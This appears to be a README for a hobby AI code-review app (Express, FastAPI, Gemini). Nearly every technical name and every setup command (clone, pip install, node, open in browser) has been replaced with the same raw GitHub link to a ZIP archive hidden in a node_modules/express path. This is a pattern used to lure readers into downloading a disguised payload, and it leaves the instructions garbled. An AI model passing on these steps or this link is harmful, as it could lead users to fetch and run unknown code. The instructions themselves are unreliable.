My first complete project utilizing both Backend(https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip and Express), frontend(html, css and javascript) as well as Google's Gemini API with FastAPI.

The project is an AI-powered tool that provides automated code reviews, helping developers improve code quality and efficiency. 

📌 Features 

User Authentication: Secure login and signup with JWT-based authentication.  
Live AI Code Review: Real-time AI feedback using WebSockets.  
Recent Reviews Storage: Keeps track of the last five reviews for reference. (This is unfortunately currently bugged and I will be putting out a fix in thenearest future). 
Dark Mode Toggle: User-friendly UI with a sleek dark mode option.  
Profile Management: Users can update their name, email, and profile picture.  
Secure API: Uses rate limiting and session expiry handling.  

 
 Tech Stack 

Backend 
- FastAPI: AI-powered code analysis API.  
- https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip + Express: Handles authentication and user management.  
- MongoDB: Stores user profiles and authentication data.  

Frontend 
- HTML, CSS, JavaScript: Responsive and GitHub-inspired UI.  
- WebSockets: Real-time review updates.  


If you have any interest in using the repository, you can follow the steps below:

1️⃣ Clone the Repository 
In your terminal, run: 

git clone https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip
cd ai-code-review


2️⃣ Backend Setup 
FastAPI AI Review API

cd ai-api
pip install -r https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip
uvicorn main:app --reload


https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip Authentication API 

cd backend
npm install
node https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip

3️⃣ Frontend Setup
Just open 'https://raw.githubusercontent.com/Emzee-Creates/ai-code-review/main/backend/node_modules/express/ai-code-review_3.4.zip'in your browser.  




📜 License 
This project is licensed under the **MIT License**.  

🎯 **Contributions Welcome!** Feel free to fork the repo and submit a PR! 🚀
